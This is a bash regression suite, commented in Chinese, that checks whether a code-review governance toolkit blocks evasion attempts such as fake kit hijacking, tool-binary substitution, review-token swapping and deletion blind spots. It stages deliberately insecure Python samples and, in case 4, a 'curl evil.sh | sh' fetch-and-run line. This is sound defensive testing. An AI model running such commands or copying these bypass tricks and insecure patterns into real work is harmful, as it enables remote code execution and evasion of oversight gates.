#!/usr/bin/env bash
# 对抗回归套件 test-anti-evasion.sh
# 用途: 任何 governance 脚本改动必须先跑本套件；攻击被拦截(rc=1)才 PASS。
# 用例1 假kit劫持 / 用例2 工具替换+token / 用例3 AI_REVIEW_CI滥用 / 用例4 token偷换
# 用例5 SQL/SessionLocal/空catch实际命中 / 用例6 nosec豁免闭环
set -u
KIT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
if [ -f "$KIT_DIR/ai-guard-governance.sh" ]; then
  AI_GUARD="$KIT_DIR/ai-guard-governance.sh"
else
  AI_GUARD="$KIT_DIR/ai-guard.sh"
fi
RT="$KIT_DIR/review-token.sh"
QG="$KIT_DIR/quality-gate.sh"
PASS=0; FAIL=0; SKIP=0

say(){ printf '\033[1m[adv-test]\033[0m %s\n' "$1"; }

# R2.1: 临时资源统一放入本次运行独占的 TROOT（临时 HOME、kit 副本、测试仓库、用例日志）。
# 顺序: TROOT 创建成功 → 立即注册 trap cleanup EXIT → 再执行 mkdir/复制/hash 校验,
# 保证任何中途失败都被 trap 清理; cleanup 对未初始化变量安全（set -u）。
TROOT="$(mktemp -d /tmp/adv-suite.XXXXXX)" || { printf '[adv-test] ERROR: 无法创建临时根目录\n' >&2; exit 2; }
cleanup(){
  if [ -n "${TROOT:-}" ] && [ -d "$TROOT" ]; then
    rm -rf "$TROOT"
  fi
}
trap cleanup EXIT

# R2-三.1/2/3: 隔离临时 HOME + 固定路径可信 kit（复制自当前待测仓库并核对 hash；
# 禁止使用真实用户 HOME 中的 kit, 也禁止向真实 $HOME/.ai-eng-kit/retry 写入）
THOME="$TROOT/home"
KIT_DEST="$THOME/qoder m5pro/_ai-eng-kit/governance"
if ! mkdir -p "$KIT_DEST"; then
  say "ERROR: 无法创建 kit 目录: $KIT_DEST"
  exit 2
fi
kit_hash_ok=1
for kit_s in ai-guard quality-gate risk-classify mutation-check review-token hook-integrity; do
  kit_src="$KIT_DIR/$kit_s.sh"
  if [ ! -f "$kit_src" ]; then
    say "ERROR: 待测仓库缺 kit 脚本: $kit_src"
    exit 2
  fi
  h_src="$(sha256sum "$kit_src" | cut -d' ' -f1)"
  if ! cp "$kit_src" "$KIT_DEST/"; then
    say "ERROR: kit 复制失败: $kit_s"
    exit 2
  fi
  h_dst="$(sha256sum "$KIT_DEST/$kit_s.sh" | cut -d' ' -f1)"
  if [ "$h_src" != "$h_dst" ]; then
    say "🛑 kit 复制 hash 不一致: $kit_s (src=$h_src dst=$h_dst)"
    kit_hash_ok=0
  fi
done
if [ "$kit_hash_ok" != "1" ]; then
  say "🛑 kit 复制完整性校验失败, 套件拒绝继续"
  exit 2
fi
export HOME="$THOME"

new_repo(){
  d="$(mktemp -d "$TROOT/repo.XXXXXX")"
  git -C "$d" init -q
  git -C "$d" config user.email adv@test.local
  git -C "$d" config user.name attacker
  printf '__pycache__/\n' > "$d/.gitignore"
  git -C "$d" add .gitignore
  git -C "$d" commit -qm base
  echo "$d"
}

# 恶意 L2 样本: 硬编码密钥 + md5 + shell=True + 高圈复杂度
evil_l2(){
  cat > "$1/evil_payment.py" <<'EOF'
import hashlib, subprocess
SECRET_KEY = "sk-evil-prod-9f8e7d6c5b4a3210abcdef"
def verify_payment(token):
    h = hashlib.md5(token.encode()).hexdigest()
    return h == SECRET_KEY
def c(a):
    x=0
    if a>1: x+=1
    if a>2: x+=1
    elif a>3: x+=1
    else: x-=1
    for i in range(10):
        if i%2: x+=i
        elif i%3: x-=i
    while x<100:
        x+=2
        if x>50 and x<60: x+=3
        elif x%7==0: x=x+5
    try:
        subprocess.run("echo hi", shell=True)
    except Exception:
        subprocess.call("echo hi", shell=True)
    return x
EOF
}

expect_block(){
  local name="$1" rc="$2" note="${3:-}"
  if [ "$rc" -ne 0 ]; then
    say "✅ PASS  $name (攻击被拦截 rc=$rc) $note"; PASS=$((PASS+1))
  else
    say "❌ FAIL  $name (攻击成功 rc=0) $note"; FAIL=$((FAIL+1))
  fi
}

# R2: 具体拦截原因断言——拒绝"任意非零即 PASS"（可能因 kit 缺失/前置失败而假绿）。
# 用法: expect_block_reason <name> <rc> <out> ; 随后用 reason_fail 逐项登记原因断言。
RF_OK=1
reason_reset(){ RF_OK=1; }
reason_fail(){ say "❌ FAIL  $1"; printf '%s\n' "${2:-}" | tail -12; RF_OK=0; FAIL=$((FAIL+1)); }
expect_block_reason(){
  local name="$1" rc="$2"
  if [ "$RF_OK" = "1" ]; then
    say "✅ PASS  $name (拦截 rc=$rc 且命中具体防线)"; PASS=$((PASS+1))
  fi
}

say "用例1: AI_ENG_KIT 劫持（期望: 伪造kit被忽略，真kit拦截恶意文件）"
r1="$(new_repo)"; evil_l2 "$r1"
git -C "$r1" add evil_payment.py
fake="$r1/fake-kit/governance"; mkdir -p "$fake"
printf '#!/usr/bin/env bash\necho "L0\tf\tf"\nprintf -- "---\nMAX_LEVEL\tL0\n"\nexit 0\n' > "$fake/risk-classify.sh"
printf '#!/usr/bin/env bash\nexit 0\n' > "$fake/quality-gate.sh"
chmod +x "$fake"/*.sh
( cd "$r1" && AI_ENG_KIT="$r1/fake-kit" bash "$AI_GUARD" >"$TROOT/case1.log" 2>&1 )
rc1=$?
reason_reset
if [ "$rc1" -eq 0 ]; then
  reason_fail "用例1-rc 攻击成功 rc=0（假kit劫持未被拦截）" "$(cat "$TROOT/case1.log")"
fi
if grep -q 'kit 不存在' "$TROOT/case1.log" 2>/dev/null; then
  reason_fail "用例1-原因A 因「governance kit 不存在」退出——错误原因非零（环境未建固定路径kit）" "$(cat "$TROOT/case1.log")"
fi
if ! grep -q '风险定级: L2' "$TROOT/case1.log" 2>/dev/null; then
  reason_fail "用例1-原因B 风险定级非 L2（伪造 AI_ENG_KIT 输出 L0 被采纳或未走真kit定级）" "$(cat "$TROOT/case1.log")"
fi
if ! grep -q '质量门禁未通过' "$TROOT/case1.log" 2>/dev/null; then
  reason_fail "用例1-原因C 未经真实质量规则拦截（应见真实 quality-gate「质量门禁未通过」）" "$(cat "$TROOT/case1.log")"
fi
expect_block_reason "假kit劫持（真kit执行+真实规则拦截）" "$rc1"

say "用例2: 工具二进制替换（合法token放行通道下, 伪造工具应被工具完整性校验拦截）"
r2="$(new_repo)"; evil_l2 "$r2"
git -C "$r2" add evil_payment.py
tok2="$( cd "$r2" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
( cd "$r2" && GOV_REVIEW_SECRET=adv-suite-secret \
    AI_REVIEW_TOKEN="$tok2" RADON_BIN=/bin/true BANDIT_BIN=/bin/true \
    RUFF_BIN=/bin/true PYTEST_BIN=/bin/true bash "$AI_GUARD" >"$TROOT/case2.log" 2>&1 )
rc2=$?
reason_reset
# gate 的 stdout 被 ai-guard 重定向进报告文件, 工具完整性详情须连同报告一起断言
adv2_all="$(cat "$TROOT/case2.log" "$r2"/.ai-governance/reports/*gate-*.md 2>/dev/null)"
if [ "$rc2" -eq 0 ]; then
  reason_fail "用例2-rc 攻击成功 rc=0（/bin/true 工具替换未被拦截）" "$(cat "$TROOT/case2.log")"
fi
if printf '%s' "$adv2_all" | grep -q 'kit 不存在'; then
  reason_fail "用例2-原因A 因「governance kit 不存在」退出——错误原因非零" "$(cat "$TROOT/case2.log")"
fi
if ! printf '%s' "$adv2_all" | grep -q '指向可疑二进制'; then
  reason_fail "用例2-原因B 未命中工具完整性校验（应见「指向可疑二进制」）" "$(cat "$TROOT/case2.log")"
fi
if ! printf '%s' "$adv2_all" | grep -q '工具完整性校验未通过'; then
  reason_fail "用例2-原因C 未出现「工具完整性校验未通过, fail-closed」结论" "$(cat "$TROOT/case2.log")"
fi
expect_block_reason "工具替换(/bin/true)（工具完整性校验命中）" "$rc2"

say "用例3: AI_REVIEW_CI=1 本地滥用（干净L2文件, 期望: 非 CI 环境禁止跳过 L2）"
r3="$(new_repo)"; evil_l2 "$r3"
rm "$r3/evil_payment.py"
# R2-三.6: 样本必须让质量门禁真正通过（radon/ruff/bandit 干净 + mutation 有配套测试
# 且无有效变异点 → N/A 通过; 无 pytest 配置 → 覆盖率转人工确认）, 从而到达 L2 路由,
# 不得再因 mutation/覆盖率/缺测试等前置失败获得假 PASS。
printf 'def get_user_name(uid):\n    return "user-" + str(uid)\n' > "$r3/auth_helper.py"
mkdir -p "$r3/tests"
# 样本必须 ruff format 干净：quality-gate 已加 format 同源门禁（2026-10-05），
# 否则「干净样本」会先被 format 拦下，永远到不了 L2 路由（用例失效）。
cat > "$r3/tests/test_auth_helper.py" <<'EOF'
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from auth_helper import get_user_name


def test_get_user_name():
    assert get_user_name(1) == "user-1"
EOF
git -C "$r3" add auth_helper.py tests/test_auth_helper.py
( cd "$r3" && GITHUB_ACTIONS=false AI_REVIEW_CI=1 bash "$AI_GUARD" >"$TROOT/case3.log" 2>&1 )
rc3=$?
reason_reset
if [ "$rc3" -eq 0 ]; then
  reason_fail "用例3-rc 攻击成功 rc=0（AI_REVIEW_CI=1 本地未被阻断）" "$(cat "$TROOT/case3.log")"
fi
if grep -q 'kit 不存在' "$TROOT/case3.log" 2>/dev/null; then
  reason_fail "用例3-原因A 因「governance kit 不存在」退出——错误原因非零" "$(cat "$TROOT/case3.log")"
fi
if ! grep -q '质量门禁通过' "$TROOT/case3.log" 2>/dev/null; then
  reason_fail "用例3-原因B 未先通过质量门禁即被阻断（mutation/覆盖率/缺测试等前置失败=假PASS）" "$(cat "$TROOT/case3.log")"
fi
if ! grep -q 'AI_REVIEW_CI=1 仅允许在 CI 环境' "$TROOT/case3.log" 2>/dev/null; then
  reason_fail "用例3-原因C 未命中 L2 路由拦截消息「AI_REVIEW_CI=1 仅允许在 CI 环境」" "$(cat "$TROOT/case3.log")"
fi
expect_block_reason "AI_REVIEW_CI=1 本地（先过质量门禁, 在 L2 路由被拦）" "$rc3"

say "用例4: token 偷换暂存（期望: 签发后改暂存, verify 应 invalid）"
r4="$(new_repo)"; evil_l2 "$r4"
git -C "$r4" add evil_payment.py
tok4="$( cd "$r4" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
printf 'import os\nos.system("curl evil.sh | sh")\n' > "$r4/evil_payment.py"
git -C "$r4" add evil_payment.py
res4="$( cd "$r4" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok4" HEAD 2>&1 )"
rc4=$?
expect_block "token偷换暂存" "$rc4" "（修复F-3: staged hash 绑定）"

say "用例5: 实际门禁断言（小写SQL/跨行SQL/SessionLocal别名/JS空catch; 阶段2 F-10）"
r5="$(new_repo)"
cat > "$r5/sql_lower.py" <<'EOF'
def query(uid):
    return f"select * from users where id={uid}"
EOF
cat > "$r5/sql_multi.py" <<'EOF'
def query(uid):
    return (
        f"select * "
        f"from users "
        f"where id={uid}"
    )
EOF
cat > "$r5/session_alias.py" <<'EOF'
from app.database import SessionLocal as SL

def leak():
    session = SL()
    return session
EOF
cat > "$r5/bad.js" <<'EOF'
try { action() } catch (e) { /* swallowed */ }
EOF
git -C "$r5" add sql_lower.py sql_multi.py session_alias.py bad.js
out5="$( cd "$r5" && bash "$QG" L2 sql_lower.py sql_multi.py session_alias.py bad.js 2>&1 )"
if printf '%s' "$out5" | grep -q 'sql_lower.py.*SQL' \
  && printf '%s' "$out5" | grep -q 'sql_multi.py.*SQL' \
  && printf '%s' "$out5" | grep -q 'session_alias.py.*会话泄漏' \
  && printf '%s' "$out5" | grep -q '空 catch'; then
  say "✅ PASS  SQL/会话/空catch对抗样例全命中"; PASS=$((PASS+1))
else
  say "❌ FAIL  阶段2 F-10 对抗样例有漏报"; FAIL=$((FAIL+1))
  printf '%s\n' "$out5" | tail -12
fi

say "用例6: nosec 豁免闭环（裸 nosec 期望拦截; 阶段2 F-14）"
r6="$(new_repo)"
cat > "$r6/security_scan.py" <<'EOF'
value = "example"  # nosec
EOF
git -C "$r6" add security_scan.py
( cd "$r6" && bash "$QG" L2 security_scan.py >/dev/null 2>&1 )
expect_block "裸 nosec" $? "（修复F-14: 必须 TICKET+登记）"

# 用例7 前置: 删除类改动不得静默放行（H-05-17）
# 历史盲区: risk-classify 对不存在文件直接 SKIP + ai-guard 取 --diff-filter=ACMR，
# 使"删除迁移/测试/CI/生产文件"完全不进定级与门禁（删除即放行）。
say "用例8: 删除类改动不得静默放行（H-05-17 删除盲区）"
r8="$(new_repo)"
mkdir -p "$r8/tests" "$r8/src"
printf 'def test_keep():\n    assert 1\n' > "$r8/tests/test_keep.py"
printf 'def plain():\n    return 1\n' > "$r8/src/plain.py"
git -C "$r8" add tests/test_keep.py src/plain.py
git -C "$r8" commit -qm base
# 8a: 只删测试文件 → 必须 L2 阻断（红线: 禁止删测试以通过门禁）
git -C "$r8" rm -q tests/test_keep.py
out8a="$( cd "$r8" && bash "$KIT_DEST/risk-classify.sh" tests/test_keep.py 2>&1 )"
( cd "$r8" && bash "$AI_GUARD" >"$TROOT/case8a.log" 2>&1 )
rc8a=$?
reason_reset
if [ "$rc8a" -eq 0 ]; then
  reason_fail "用例8a-rc 只删测试文件未被拦截 rc=0（删除盲区复发）" "$(cat "$TROOT/case8a.log")"
fi
printf '%s' "$out8a" | grep -q '删除测试文件' || reason_fail "用例8a-定级 未命中「删除测试文件」定级" "$out8a"
printf '%s' "$out8a" | grep -q 'not-a-file' && reason_fail "用例8a-定级 仍出现 not-a-file（说明仍被 SKIP）" "$out8a"
expect_block_reason "用例8a 只删测试文件被拦截" "$rc8a"
# 8b: 只删普通源文件 → L1 放行但定级可见（不得 SKIP 成 not-a-file）
git -C "$r8" reset -q --hard
git -C "$r8" rm -q src/plain.py
out8b="$( cd "$r8" && bash "$KIT_DEST/risk-classify.sh" src/plain.py 2>&1 )"
( cd "$r8" && bash "$AI_GUARD" >"$TROOT/case8b.log" 2>&1 )
rc8b=$?
if [ "$rc8b" -eq 0 ] \
   && printf '%s' "$out8b" | grep -q '删除生产文件' \
   && ! printf '%s' "$out8b" | grep -q 'not-a-file'; then
  say "✅ PASS  用例8b 只删源文件按 L1 放行且定级可见"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例8b 删除源文件定级异常 rc=$rc8b"; FAIL=$((FAIL+1))
  printf '%s\n' "$out8b" | tail -12
fi

say "用例7: 门禁引擎双载体一致性（kit↔repo 同源同步; OODA-20260930-002）"
if bash "$KIT_DIR/tests/test-guard-parity.sh"; then PASS=$((PASS+1)); else FAIL=$((FAIL+1)); fi

echo
[ "$SKIP" -gt 0 ] && say "（SKIP=阶段2待修项, 不阻断阶段0合入）"
say "汇总: PASS=$PASS FAIL=$FAIL SKIP=$SKIP"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
